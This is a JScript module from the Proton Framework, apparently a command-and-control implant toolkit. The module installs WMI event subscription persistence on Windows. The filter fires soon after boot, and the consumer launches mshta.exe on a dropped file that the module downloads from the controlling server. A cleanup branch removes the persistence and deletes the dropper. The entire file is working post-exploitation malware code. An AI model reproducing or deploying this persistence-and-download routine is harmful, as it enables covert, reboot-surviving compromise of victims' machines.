//            ---------------------------------------------------
//                             Proton Framework              
//            ---------------------------------------------------
//                Copyright (C) <2019-2020>  <Entynetproject>
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

try
{

    var headers = {};
    var subname = "Proton";
    var droppath = proton.file.getPath("~FDROPDIR~\\~FDROPFILE~");

    if (~CLEANUP~)
    {
        var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
        wmi.Delete("\\\\.\\root\\subscription:__EventFilter.Name=\""+subname+"\"");
        wmi.Delete("\\\\.\\root\\subscription:CommandLineEventConsumer.Name=\""+subname+"\"");
        var ftcb = wmi.Get("__FilterToConsumerBinding").Instances_();
        var instancecount = ftcb.Count;
        var i;
        for (i = 0; i < instancecount; i++) {
            var cons = ftcb.ItemIndex(i);
            if (cons.Consumer.indexOf(subname) != -1) {
                cons.Delete_();
            }
        }
        headers["Task"] = "RemovePersistence";
        proton.work.report("done", headers);
        headers["Task"] = "DeleteDropper";
        proton.file.deleteFile(droppath);
        proton.work.report(proton.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
    }
    else
    {
        var wmi1 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
        var eventfilterclass = wmi1.Get("__EventFilter");
        var eventfilter = eventfilterclass.SpawnInstance_();
        eventfilter.Name = subname;
        eventfilter.EventNameSpace = "root\\Cimv2";
        eventfilter.QueryLanguage = "WQL";
        eventfilter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300";
        var res = eventfilter.Put_();
        headers["Task"] = "CreateFilter";
        proton.work.report(res.Path, headers);

        var wmi2 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
        var commandlineeventclass = wmi2.Get("CommandLineEventConsumer");
        var commandlineevent = commandlineeventclass.SpawnInstance_();
        commandlineevent.Name = subname;
        commandlineevent.CommandLineTemplate = "C:\\Windows\\system32\\mshta.exe "+droppath;
        commandlineevent.RunInteractively = "false";
        res = commandlineevent.Put_();
        headers["Task"] = "CreateConsumer";
        proton.work.report(res.Path, headers);

        var wmi3 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
        var filtertoconsumerbindingclass = wmi3.Get("__FilterToConsumerBinding");
        var filtertoconsumerbinding = filtertoconsumerbindingclass.SpawnInstance_();
        filtertoconsumerbinding.Filter = "__EventFilter.Name=\""+subname+"\"";
        filtertoconsumerbinding.Consumer = "CommandLineEventConsumer.Name=\""+subname+"\"";
        res = filtertoconsumerbinding.Put_();
        headers["Task"] = "CreateBinding";
        proton.work.report(res.Path, headers);

        headers["X-UploadFileJob"] = "true";
        proton.http.downloadEx("POST", proton.work.make_url(), headers, droppath);
        headers["X-UploadFileJob"] = "false";
        headers["Task"] = "AddDropper";
        proton.work.report(proton.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
    }
    proton.work.report("Complete");
}
catch (e)
{
    proton.work.error(e);
}

proton.exit();
